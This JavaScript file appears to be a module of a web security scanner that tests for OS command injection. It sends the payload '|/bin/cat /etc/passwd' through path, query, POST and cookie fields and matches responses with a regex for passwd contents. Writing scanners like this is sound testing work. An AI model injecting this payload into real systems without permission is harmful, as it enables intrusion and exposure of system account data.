/* Author: Denis Podgurskii */
import { ptk_module_active } from "../active.js"

export class ptk_oscommand extends ptk_module_active {
    constructor() {
        super()
        
        this.severity = 'High'
        this.attacks = [
            {
                id: 'oscommand_1',
                description: 'OS Command Injection - Unix File (cat passwd)',
                methods: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
                location: ['Path', 'Query', 'Post', 'Cookie'],
                options: {
                    attackValue: `|/bin/cat /etc/passwd`,
                    vulnRegex: `\\broot:.{0,20}:\\d+:\\d+:.{0,60}:|Exception: Could not find a part of the path|Exception: Could not find file`,
                    position: 'after'
                }
            }
        ]
    }
}